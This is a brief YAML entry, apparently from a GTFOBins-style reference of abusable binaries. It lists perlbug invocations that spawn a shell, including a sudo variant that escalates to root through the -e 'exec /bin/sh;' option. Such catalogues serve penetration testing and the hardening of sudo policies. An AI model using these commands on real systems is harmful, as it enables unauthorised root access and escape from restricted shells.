---
functions:
  shell:
    - code: perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
  sudo:
    - code: sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
---
